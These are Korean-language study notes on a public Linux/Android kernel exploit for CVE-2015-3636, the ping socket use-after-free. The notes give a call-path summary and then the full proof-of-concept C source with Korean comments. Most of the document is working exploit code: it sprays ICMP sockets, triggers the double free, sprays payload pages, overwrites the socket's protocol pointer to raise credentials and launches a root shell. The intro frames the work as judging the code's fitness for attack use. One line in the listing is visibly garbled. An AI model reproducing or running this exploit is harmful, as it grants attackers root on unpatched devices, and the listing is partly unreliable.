https://github.com/fi01/CVE-2015-3636/blob/master/poc.c

CVE-2015-3636 PoC 코드 분석 노트
(리눅스 안드로이드 커널 취약점 익스플로잇)

ㅁ 전략:
일단 우선 메인이 되는 익스플로잇을 찾는 다음에 분석하고 공격 용도로 적합한지 분석하는 방향으로 체크한다.

ㅁ 전술:
--게임이 적합한 용도인지 체크한다.
--PoC 코드가 공격용도에 맞는지 체크한다.

ㅁ PoC 코드 (poc.c)

코드를 간략히 하기 위한 커스토마이징 후에
코드를 분석해서 내어 놓는다.
한글 분석 자료를 마련해서 한국 코리안 해커들의 지세를 든든히 한다.
이 자료는 랜덤(임의) 주소에 맵(페이지)를 하나 매핑시키는 코드이다.
예제의 소개에서 나와 있다.

1day:
간단히 함수에 대한 분석을 마감했다. v

2day:
간단히 함수의 메인 함수 특성과 트리거 함수를 구분해서 분석한다. vv
콜패스 그리기.

3day:
세부 소켓 관련 함수의 복잡성을 이해할 수 있는 구조를 그린다. vvv
콜 패스를 그려보니, 메인 함수에서 더블 프리되는 크래시 방지 함수 호출 뒤에 icmp 소켓을 생성 연결해서
페이로드를 채우고, 메모리 페이지를 위치(맵핑)하고 값을 써 넣어서 소켓을 제어한 다음 트리거 함수를 호출해서
/bin/sh 쉘을 실행함으로써 권한 상승된 루트쉘을 획득하는 기능으로 요약되었다.

4day:
내부 구조를 통해서 이해할 수 있도록 소켓을 이해한다.
메모리 구조 이해 필요!

5day:
분석 마감하고 보고서를 남긴다.


// 콜 패스(Call path)
main -> protect_crash_when_double_free (더블 프리되는 크래시 방지 함수)

         -> create_vul_sockets ( 취약 소켓 연결 )
            +->socks = malloc() // 소켓 메모리 할당.
            +->create_child // 자식 프로세스 할당.
            +->create_icmp_socket // icmp 소켓 생성.
            +->close_child_sockets // 자식 소켓 닫음.
            +->setup_vul_socket(socks[i]) // 취약 소켓 설정. 
                +-> connect 두 번 호출해서 icmp 소켓 두 개 형성.

         -> try_control_sk (소켓 제어) 

            +-> mmap() // 메모리 페이지 하나 할당.
            +-> lock_page_in_memory() 메모리 페이지 잠금.
            +-> fill_with_payload() 페이로드를 채움. (페이지 사용)
            +-> get_sk_from_timestamp() 루프안에서 소켓들에서 타임스탬프를 읽어오는 기능.

         -> do_get_root (트리거 함수: 소켓 제어 다음에 루트쉘 획득!)
            +-> get_sk_from_timestamp(socks[i], (unsigned long *)&sk) // 소켓에서 타임스탬프를 읽는 기능.
            +-> setup_get_root(sk) // 루트를 획득하도록 설치하는 기능.
            +-> system("/system/bin/sh"). // 루트쉘 실행.


이렇게 간단합니다. 이 소스 코드는 아시다시피 소켓 제어를 통해서 페이로드를 메모리 상에 위치시키고
적당히 제어를 한 다음에 쉘을 실행시켜서 권한 상승된 루트를 획득합니다.

복잡하지만, 분석해야  할 필요가 있는 부분은 뭐냐면은요.
코드가 어떻게 해서 취약해졌냐 하는 취약 소켓 공격 부분입니다.


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>

// 공격 코드에 쓰일 환경 설정 값들 선언.
#define MAX_CHILDREN_PROCESS    1024
#define MAX_CHILDREN_SOCKETS    65000
#define MAX_MMAPS               1024 // 최대 MMAP 수는 1024개.

#define MMAP_BASE(x)		(((unsigned)(x)) & ~(MMAP_SIZE - 1))
#define MMAP_SIZE               (2 * 1024 * 1024)

#define DEFAULT_RESERVE_SIZE    (64 * 1024 * 1024)

#define TIMESTAMP_MAGIC         0x0db4da5f

#define ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))

#define OFFSET_SK_PROT          0x24
#define OFFSET_SK_STAMP         0x148
#define OFFSET_MC_LIST          0x1c4

#ifndef SIOCGSTAMPNS
#define SIOCGSTAMPNS            0x8907
#endif /* SIOCGSTAMPNS */

#define OOM_DISABLE             (-17)

#define NSEC_PER_SEC            1000000000

#define LIST_POISON2            0x00200200

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))


// 루트 권환의 태스크 크리덴셜을 갱신하는 전역 함수를 선언.
extern void obtain_root_privilege_by_modify_task_cred(void);

// 자식 태스크 상태 구조를 소켓 별로 선언.
struct child_status_t {
  int num_sockets;
  int result;
};

static size_t
get_page_size(void) // 페이지 크기 구하는 함수.
{
  static size_t pagesize;

  if (pagesize == 0) {
    pagesize = sysconf(_SC_PAGESIZE);
  }

  return pagesize;
}

static int
maximize_fd_limit(void) // fd(파일 디스크립트) 제한값 구한 다음 제한된 최대치로 설정하는 함수.
{
  struct rlimit rlim;
  int ret;

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  rlim.rlim_cur = rlim.rlim_max;
  setrlimit(RLIMIT_NOFILE, &rlim);

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  return rlim.rlim_cur;
}

static int
wait_for_sockets_created(int pipe_read, int *num_socks_created) // 소켓들의 생성을 기다리는 함수.
{
  struct child_status_t status;
  int i;
  int ret;

  *num_socks_created = 0;

  ret = fcntl(pipe_read, F_SETFL, O_NONBLOCK); // 블록 논 플래그 설정 기능으로 파이프에 설정.
  if (ret == -1) {
    perror("fcntl()");
    return -1;
  }

  for (i = 0; i < 50; i++) {
    ret = read(pipe_read, &status, sizeof status); // 50개의 파이프를 읽음.
    if (ret == -1 && errno == EAGAIN) {
      usleep(100000);
      continue;
    }

    break;
  }

  if (ret == -1 && errno == EAGAIN) {
    printf("read(): Timeout\n");
    return -1;
  }

  if (ret == -1) {
    perror("read()");
    return -1;
  }

  if (ret != sizeof (status)) {
    printf("read(): Unexpected EOF\n");
    return -1;
  }

  *num_socks_created = status.num_sockets; // 몇개의 소켓이 열렸는지 상태를 설정.

  return status.result;
}

static int
send_status_to_parent(int pipe_write, int num_sockets, int result) // 부모 프로세스로 상태 값을 전달하는 함수.
{
  struct child_status_t status;

  memset(&status, 0, sizeof status);

  status.num_sockets = num_sockets;
  status.result = result;

  write(pipe_write, &status, sizeof status); // 파이프 쓰기로 status 함수를 써서 부모 프로세스에 상태 값 전달.

  return 0;
}

static int
wait_to_close(int pipe_write) // 파이프의 종료를 기다리는 함수.
{
  close(pipe_write); // 쓰기 파이프 닫기.

  while (1) {
    sleep(60);
  }
}

static int
close_all_fds_except_pipe(int pipe_write, int num_fds) // 파이프 이외의 다른 모든 fd(파일 디스크립트)가 닫히길 기다리는 함수.
{
  int i;
  int result;

  result = 0;

  for (i = 0; i < num_fds; i++) {
    int ret;

    if (i == pipe_write) {
      continue;
    }

    ret = close(i);
    if (ret != 0) {
      result = -1;
    }
  }

  return result;
}

static int
setup_vul_socket(int sock) // 취약한 소켓 설정. (주요 함수 PoC 코드임) *****.
{
  struct sockaddr_in sa;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_UNSPEC;

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    printf("connect(%d) #1: ret = %d\n", sock, ret);
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    printf("connect%d() #2: ret = %d\n", sock, ret);
    return -1;
  }

  return 0;
}

static int
create_icmp_socket(void) // icmp 소켓 생성 함수.
{
  struct sockaddr_in sa;
  int sock;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_INET;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP); // ICMP 소켓 만들기.
  if (sock == -1) {
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa); // 소켓 연결 생성.
  if (ret != 0) {
    int result;

    result = errno;
    close(sock);
    errno = result;

    return -1;
  }

  return sock; // 소켓 디스크립트 반환.
}

static int
close_icmp_socket(int sock) // icmp 소켓 닫는 함수.
{
  return close(sock);
}

/*
	do_child_task: pipe_write 인자로 받아서 파이프를 제외한 파일 디스크립트를 모두 닫고
	num_fds 인자로 받은 수 만큼 icmp 소켓을 만들어 연결하고, 부모 프로세스에 pipe_write와 num_fds로 상태를
               전송하고 icmp 소켓을 모두 닫는 기능의 함수.
*/
static int
do_child_task(int pipe_write, int num_fds) // 자식 태스크를 생성하는 함수.
{
  int socks[num_fds];
  int result;
  int ret;
  int i;

  result = 0;

  close_all_fds_except_pipe(pipe_write, num_fds);

  for (i = 0; i < num_fds; i++) {
    socks[i] = create_icmp_socket();
    if (socks[i] == -1) {
      result = errno;
      break;
    }
  }

  num_fds = i;

  send_status_to_parent(pipe_write, num_fds, result);
  wait_to_close(pipe_write);

  for (i = 0; i < num_fds; i++) {
    ret = close_icmp_socket(socks[i]);
  }

  if (ret == -1) {
    return -1;
  }

  return 0;
}

static int
create_child(int *pipe_read, int num_fds, pid_t *pid, int *num_socks_created) // 자식 프로세스 생성 함수.
{
  int pipe_fds[2];
  int ret;

  *pid = -1;
  *num_socks_created = 0;

  ret = pipe(pipe_fds); // 파이프 생성.
  if (ret != 0) {
    perror("pipe()");
    return -1;
  }

  *pid = fork(); // 프로세스 생성.
  if (*pid == -1) {
    perror("fork()");
    return -1;
  }

  if (*pid == 0) {
    close(pipe_fds[0]); // 읽기 파이프 닫기.

     // 여기서 do_child_task 함수가 호출되는데 자식 태스크라는게 icmp 소켓으로 생성되는 소켓(태스크)를 의미한다.
    // 커널 쓰레드 비슷한 의미로 쓰인 듯하며, 실제의 프로세스를 생성하는 것은 아니다. 태스크를 통해서 커널 태스크가
    // 공격에 이용되는 것인 거 같다.
    do_child_task(pipe_fds[1], num_fds); // 쓰기 파이프(pipe_fds[1])으로 자식 채스트 생성.
    exit(0);
  }

  close(pipe_fds[1]);
  *pipe_read = pipe_fds[0];

  ret = wait_for_sockets_created(*pipe_read, num_socks_created); // 소켓 생성시까지 기다린다.
  if (ret == EMFILE) {
    ret = 0;
  }

  if (ret != 0) {
    kill(*pid,  SIGKILL);
  }

  return ret;
}

static int
close_child_sockets(int pipe_read, pid_t pid) // 모든 소켓을 닫는 함수. (최종 결론).
{
  int timeout;
  int status;
  int success;
  int ret;

  success = 0;

  close(pipe_read);
  kill(pid,  SIGTERM);

  for (timeout = 50; timeout > 0; timeout--) {
    ret = waitpid(pid, &status, WNOHANG);
    if (ret != 0) {
      break;
    }

    if (WIFEXITED(status)) {
      success = 1;
      break;
    }

    usleep(100000);
  }

  kill(pid,  SIGKILL);

  ret = waitpid(pid, &status, 0);
  if (ret != 0) {
    return -1;
  }

  if (WIFEXITED(status)) {
    success = 1;
  }

  if (success) {
    return 0;
  }

  return -1;
}

int *
create_vul_sockets(void) // 취약 소켓들을 생성하는 함수.
{
  static pid_t pids[MAX_CHILDREN_PROCESS];
  static int pipe_reads[MAX_CHILDREN_PROCESS];
  int max_fds;
  int *socks;
  int num_socks;
  int num_children_process;
  int num_children_socks;
  int ret;
  int i;

  printf("Creating target socket..."); 
  fflush(stdout);

  max_fds = maximize_fd_limit();

  socks = malloc((max_fds + 1) * sizeof (*socks));
  if (!socks) {
    printf("\nNo memory\n");
    return NULL;
  }

  num_children_process = 0;
  num_socks = 0;
  num_children_socks = 0;
  ret = 0;

  for (i = 0; i < MAX_CHILDREN_PROCESS; i++) {
    int max_children_socks;
    int num_socks_created;

    max_children_socks = max_fds;
    if (max_children_socks + num_children_socks > MAX_CHILDREN_SOCKETS) {
      max_children_socks = MAX_CHILDREN_SOCKETS - num_children_socks;
      if (max_children_socks < 1) {
        break;
      }
    }

    ret = create_child(&pipe_reads[i], max_children_socks, &pids[i], &num_socks_created);
    if (pids[i] == -1) {
      break;
    }

    num_children_process++;
    num_children_socks += num_socks_created;

    printf(".");
    fflush(stdout);

    if (num_socks < max_fds) {
      socks[num_socks] = create_icmp_socket();
      if (socks[num_socks] == -1) {
        break;
      }

      num_socks++;
    }

    if (ret != 0) {
      break;
    }
  }

  printf(" OK\n");
  printf("%d + %d sockets created\n", num_socks, num_children_socks);

  for (i = 0; i < num_children_process; i++) {
    close_child_sockets(pipe_reads[i], pids[i]);
  }

  if (num_socks < 1) {
    printf("No icmp socket available\n");
    free(socks);
    return NULL;
  }

  socks[num_socks] = -1;

  for (i = 0; i < num_socks; i++) {
    ret = setup_vul_socket(socks[i]);
  }

  return socks;
}

static int
protect_from_oom_killer(void) // OOM(Out of memory) 막는 함수.
{
  int fd;
  char buf[16];
  int ret;

  fd = open("/proc/self/oom_adj", O_WRONLY);
  if (fd == -1) {
    perror("open() in protect_from_oom_killer()");
    return -1;
  }

  sprintf(buf, "%d\n", OOM_DISABLE);

  ret = write(fd, buf, strlen(buf));
  if (ret == -1) {
    perror("write() in protect_from_oom_killer()");
    return -1;
  }

  ret = close(fd);
  if (ret == -1) {
    perror("close() in protect_from_oom_killer()");
    return -1;
  }

  return 0;
}

static int
lock_page_in_memory(void *address, size_t size) // 메모리의 페이지를 잠그는 함수.
{
  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

static void
populate_pagetable_for_address(void *address) // 주소를 팝핑하는 함수.
{
  *(void **)address = NULL;
}

static void *
protect_crash_when_double_free(void)
{
  void *address;
  size_t pagesize;

  pagesize = get_page_size();

  address = (void *)((LIST_POISON2 / pagesize) * pagesize);

  address =  mmap(address, pagesize,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                 -1, 0);

  if (address == MAP_FAILED) {
    return NULL;
  }

  populate_pagetable_for_address(address);
  lock_page_in_memory(address, pagesize);

  return address;
}

static int
free_protect(void *protect) // protect 페이지를 해제하는 함수.
{
  size_t pagesize;

  pagesize = get_page_size();
  return munmap(protect, pagesize);
}

static void
fill_with_payload(void *address, size_t size) // 페이로드 채우는 함수. (p포인터에 채움).
{
  unsigned *p = address;
  int i;

  for (i = 0; i < size; i += sizeof (*p) * 2) {
    *p++ = (unsigned)p;
    *p++ = TIMESTAMP_MAGIC;
  }
}

static int
get_sk_from_timestamp(int sock, unsigned long *paddr) // 소켓에서 타임 스탬프를 읽는 함수.
{
  struct timespec tv;
  uint64_t value;
  uint32_t high, low;
  int ret;

  ret = ioctl(sock, SIOCGSTAMPNS, &tv);
  if (ret != 0) {
    return -1;
  }

  value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
  high = (unsigned)(value >> 32);
  low = (unsigned)value;

  if (high == TIMESTAMP_MAGIC) {
    if (paddr)
      *paddr = low - OFFSET_SK_STAMP;
    return 1;
  }

  return 0;
}

static int
try_control_sk(int *socks) // 소켓 제어 시도 함수.
{
  static int reserve_size = DEFAULT_RESERVE_SIZE;
  static int loop_count = 0;
  static void *address[MAX_MMAPS];
  struct sysinfo info;
  int success;
  int count;
  int i;
  int ret;

  success = 0;

  loop_count++;

  for (i = 0; i < MAX_MMAPS; i++) { // MAX_MMAPS 갯수 만큼 mmap() 함수로 페이지를 할당을 반복함.
    int j;

    ret = sysinfo(&info); // 시스템 정보 info 얻기.
    if (ret == 0) {
      if (info.freeram < reserve_size) { // RAM 메모리 남은 용량만큼 4바이트 단위로 예약된 메모리 (info.freeram) 구함. 
        if (loop_count < 4) {
          reserve_size = info.freeram;
        }

        break;
      }
    }

    address[i] =  mmap(NULL, MMAP_SIZE, // mmap 메모리 페이지 할당해서 익명 페이지로 address[] 배열에 저장.
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (address[i] == MAP_FAILED) {
      printf("mmap(): failed: %s (%d)\n", strerror(errno), errno);
      break;
    }

    lock_page_in_memory(address[i], MMAP_SIZE); // 메모리 페이지 락!
    fill_with_payload(address[i], MMAP_SIZE);

    for (j = 0; socks[j] != -1; j++) { // 인자로 넘겨받은 socks 소켓 배열 변수를 읽으면서 소켓 타임스탬프를 읽고 읽혀지면 코드 브레이크.
      ret = 	(socks[j], NULL);
      if (ret > 0) {
        success = 1;
        address[i] = 0;
      }
    }

    if (success) { // 타임 스탬프 읽어지면 코드 브레이크.
      break;
    }
  }

  count = i; // count = i(할당 가능했던 페이지 갯수)를 설정.
  printf("%d bytes allocated\n", count * MMAP_SIZE);

  for (i = 0; i < count; i++) { // 사용된 페이지를 address[] 배열에서 munmap 함수로 모두 해제.
    if (address[i]) {
      munmap(address[i], MMAP_SIZE);
    }
  }

  if (success) {
    return 0;
  }

  return -1;
}

static int
setup_get_root(void *sk) // get_root 함수를 소켓을 통해 설치하는 함수.
{
  static unsigned prot[256];
  unsigned *mmap_end_address;
  unsigned *p;
  int i;

  for (i = 0; i < ARRAY_SIZE(prot); i++) {
    prot[i] = (unsigned)obtain_root_privilege_by_modify_task_cred; // 전역 함수 주소로 선언된 값을 prot[] 배열 256개에 채움.
  }

  mmap_end_address = (void *)MMAP_BASE(sk) + MMAP_SIZE - 1;

  for (i = OFFSET_MC_LIST - 32; i < OFFSET_MC_LIST + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = 0;
  }

  for (i = OFFSET_SK_PROT - 32; i < OFFSET_SK_PROT + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = (unsigned)prot; // p 소켓 포인터 = prot[] 배열 시작 주소 설정해서 태스크 크리덴셜 갱신 유도함. 
  }
}

static void
keep_invalid_sk(void) // invalid(부적당한) 소켓을 유지하는 함수.
{
  pid_t pid;

  printf("\n");
  printf("There are some invalid sockets.\n");
  printf("Please reboot now to avoid crash...\n");

  pid = fork();
  if (pid == -1 || pid == 0) {
    close(0);
    close(1);
    close(2);

    while (1) {
      sleep(60);
    }
  }
}

static void
do_get_root(int *socks) // 익스플로잇 트리거 함수.
{
  int success;
  int has_invalid_sk;
  int ret;
  int i;

  success = 0;
  has_invalid_sk = 0;

  for (i = 0; socks[i] != -1; i++) {
    void *sk;

    ret = get_sk_from_timestamp(socks[i], (unsigned long *)&sk);
    if (ret <= 0) {
      has_invalid_sk = 1;
      continue;
    }

    setup_get_root(sk);

    close_icmp_socket(socks[i]);

    if (getuid() == 0) {
      success = 1;
    }
  }

  if (has_invalid_sk) {
    protect_from_oom_killer();
  }

  if (success) {
    system("/system/bin/sh");
  }
  else {
    printf("Failed to get root.\n");
  }

  if (has_invalid_sk) {
    keep_invalid_sk();
  }
}

int
main(int argc, char *const argv[]) // 엔트리 포인트: 메인 함수.
{
  void *protect = NULL;
  int *socks;
  int ret;

  protect = protect_crash_when_double_free(); // 더블 프리 크래시 체크.
  if (!protect) {
    printf("Error in protect_crash_when_double_free()\n");
    return 1;
  }

  socks = create_vul_sockets(); // 취약 소켓들 설정.
  if (socks == NULL) {
    return 1;
  }

  while (1) {
    ret = try_control_sk(socks); // 소켓 컨트롤 시도.
    if (ret == 0) {
      printf("Done!\n");
      break;
    }
  }

  do_get_root(socks); // 트리거 함수 호출! (루트 쉘 획득!)ㄴ

  return 0;
}